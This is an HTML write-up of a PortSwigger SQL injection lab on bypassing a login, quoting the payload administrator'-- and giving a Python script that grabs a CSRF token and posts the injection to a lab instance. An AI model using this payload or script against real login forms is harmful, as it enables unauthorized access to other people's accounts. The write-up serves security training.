 <title>portswigger---login bypass and Subverting application logic
 Writeup  </title>
 

<!DOCTYPE html>
<html>
 
<body>
    <h1>portswigger---login bypass and Subverting application logic
 Writeup </h1>

    <h2>Challenge Description</h2>
    <p>  Subverting application logic
Imagine an application that lets users log in with a username and password. If a user submits the username wiener and the password bluecheese, the application checks the credentials by performing the following SQL query:

SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
If the query returns the details of a user, then the login is successful. Otherwise, it is rejected.

In this case, an attacker can log in as any user without the need for a password. They can do this using the SQL comment sequence -- to remove the password check from the WHERE clause of the query. For example, submitting the username administrator'-- and a blank password results in the following query:

SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
This query returns the user whose username is administrator and successfully
problem and solution of this lab
https://portswigger.net/web-security/sql-injection/lab-login-bypass
</p>

    <h2>Solution Approach</h2>
    <p>Here are the steps we took to solve the challenge:</p>
    <ol> 
     Use Burp Suite to intercept and modify the login request.
Modify the username parameter, giving it the value: administrator'-- and this pytthon code
<pre>
import requests
from bs4 import BeautifulSoup
def solve(url,path="login"):
 # Target URL
 base_url = "https://0ad700ab04e214f480591cad0010007c.web-security-academy.net"
 login_url = base_url + "/login"
 # Create a session to persist cookies
 session = requests.Session()
 # Step 1: Get the CSRF token from the login page
 response = session.get(login_url, verify=False)
 soup = BeautifulSoup(response.text, "html.parser")
 # Extract CSRF token from input field
 csrf_token = soup.find("input", {"name": "csrf"})
 if csrf_token:
    csrf_token = csrf_token["value"]
    print(f"[+] Found CSRF token: {csrf_token}")
 else:
    print("[-] CSRF token not found. Exiting.")
    exit()
 # Step 2: Perform the SQL Injection attack
 payload = {
    "csrf": csrf_token,
    "username": "administrator' -- ",
    "password": "anyPassword"
 }

 # Send the POST request with CSRF token
 response = session.post(login_url, data=payload, verify=False)
 # Step 3: Check if login was successful
 print(f"Status Code: {response.status_code}")
 if "Your username is: administrator" in response.text:
    print("[+] Injection successful! Logged in as admin.")
 else:
    print("[-] Injection failed.")
#https://0ae700be049cfce18390e9b6003b0001.web-security-academy.net/filter?category=


 
</pre>
    </ol>
<br>
    <h2>Flag</h2>
    <p class="flag">will solved after login as admin

    <h2>Conclusion</h2>
    <p>this is a medium chanllenge for work on  web anbd sqli and bypass login</p>

</body>
</html>
